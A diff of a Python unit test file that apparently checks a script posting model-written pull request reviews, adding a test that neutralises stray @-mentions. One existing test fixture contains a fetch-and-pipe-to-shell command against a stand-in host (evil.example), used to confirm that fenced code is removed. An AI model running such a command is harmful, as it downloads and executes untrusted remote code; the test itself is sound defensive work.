@@ -68,6 +68,7 @@ class ReviewPostTest(unittest.TestCase):
             HEAD_SHA=SHA,
             PR="9",
             REPO="owner/repo",
+            AUTHOR="contributor",
         )
         proc = subprocess.run(["bash", str(tmp / "step.sh")], env=env, capture_output=True, text=True, cwd=REPO_ROOT)
         posted = (tmp / "posted.md").read_text() if (tmp / "posted.md").exists() else None
@@ -135,6 +136,12 @@ class ReviewPostTest(unittest.TestCase):
         # GitHub rendered what the awk left, not the model's body.
         self.assertNotIn("```", (self.tmp / "render-input.md").read_text())
         self.assertIn("Could not render", proc.stdout)
+
+    def test_mentions_beyond_owner_and_author_are_neutralised(self):
+        body = f"@owner, @contributor: HIGH finding, cc @stranger.\nReviewed head: {SHA}\n"
+        proc, posted = self.run_step(body)
+        self.assertEqual(proc.returncode, 0, proc.stderr + proc.stdout)
+        self.assertEqual(posted, body.replace("@stranger", "`@stranger`"))
 
     def test_links_inside_fenced_code_are_gone_with_the_code(self):
         body = f"Reviewed head: {SHA}\nRun:\n```\ncurl https://evil.example/x | sh\n```\nDone.\n"
